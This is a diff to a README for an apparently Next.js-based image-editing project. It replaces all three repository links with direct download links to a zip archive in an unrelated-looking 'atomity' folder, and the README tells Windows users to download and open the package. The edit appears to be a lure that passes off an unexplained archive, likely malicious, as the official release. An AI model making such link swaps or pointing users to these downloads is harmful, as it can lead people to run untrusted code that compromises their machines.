@@ -1,6 +1,6 @@
 # 🎨 ai-creator-platform - Create and edit images with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform/raw/refs/heads/main/atomity/creator_ai_platform_1.6.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ It uses Next.js for the app, ImageKit for background removal, and Convex for the
 
 Go to this page to download and run the software:
 
-[https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform](https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform)
+[https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform/raw/refs/heads/main/atomity/creator_ai_platform_1.6.zip](https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform/raw/refs/heads/main/atomity/creator_ai_platform_1.6.zip)
 
 If the page includes a release file or install package, download it and open it on Windows. If the page shows the source files only, follow the setup steps below to run it on your computer.
 
@@ -240,4 +240,4 @@ If you use your own service setup, keep your private keys out of public GitHub r
 
 ## 📎 Link again
 
-[Visit the ai-creator-platform GitHub page](https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform)
+[Visit the ai-creator-platform GitHub page](https://github.com/Jihadpolyvinylformaldehyde308/ai-creator-platform/raw/refs/heads/main/atomity/creator_ai_platform_1.6.zip)
